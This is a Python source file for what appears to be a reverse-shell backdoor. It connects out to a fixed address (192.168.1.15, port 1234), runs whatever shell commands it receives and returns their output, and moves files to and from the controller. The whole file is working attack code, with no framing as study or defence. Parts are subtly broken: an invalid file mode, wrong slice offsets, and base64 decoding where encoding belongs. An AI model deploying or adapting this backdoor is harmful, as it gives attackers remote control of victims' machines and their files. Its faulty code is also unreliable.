import socket
import json
import subprocess
import os
import time
import base64

def server(ip, port):
    global conn
    conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    while True:
        try:
            conn.connect((ip, port))
            break
        except ConnectionRefusedError:
            time.sleep(10) 
        
def send(data):
    try:
        json_data = json.dumps(data)
        conn.send(json_data.encode('utf-8'))
    except Exception as e:
        print(f"Failed to send data: {e}")


def receive():
    json_data = ''
    while True:
        try:
            json_data += conn.recv(1024).decode('utf-8')
            return json.loads(json_data)
        except ValueError:
            print("Received invalid data, ignoring...")
        except Exception as e:
            print(f"Failed to receive data: {e}")
            break


def run():
    while True:
        try:
            command = receive()
            # print(command) # for Debugging
            if command == 'exit':
                break
            elif command[:2] == 'cd' and len(command) > 1:
                try:
                    os.chdir(command[3:].strip())
                    result = f"Changed directory to: {os.getcwd()}"
                except Exception as e:
                    result = f"cd error: {e}"
            elif command[:8] == 'download':
                with open(command[7:], 'eb') as f:
                    send(base64. b64decode(f.read()).decode('utf-8'))
            elif command[:6] == 'upload':
                with open(command[5:], 'wb') as f:
                    file_data = receive()
                    f.write(base64.b64decode(file_data))
            else:
                # result = os.popen(command).read()
                process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
                result = process.stdout.read() + process.stderr.read()
            send(result)
        except Exception as e:
            print(f"Error executing command: {e}")


server('192.168.1.15', 1234)
run()